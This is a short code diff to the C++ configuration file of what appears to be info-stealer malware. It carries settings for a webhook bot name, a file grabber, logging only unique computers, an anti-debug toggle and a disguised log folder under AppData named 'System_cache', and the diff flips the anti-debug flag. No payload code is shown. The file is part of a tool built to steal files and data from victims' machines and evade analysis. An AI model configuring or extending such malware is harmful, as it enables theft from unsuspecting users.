@@ -30,6 +30,6 @@ namespace config {
 	const std::string Bot_name = ""; // name of that WebHook
 	const bool enableFileGrubber = false; // enable file grabber
 	const bool oneStart = false; // enable this if you want logs to come only from unique computers
-	const bool debuging = false; // disable AntiDebug (do not change if you do not know what it is responsible for)
+	const bool debuging = true; // disable AntiDebug (do not change if you do not know what it is responsible for)
 	const std::string path = "/AppData/Local/System_cache"; // path to logs
 }
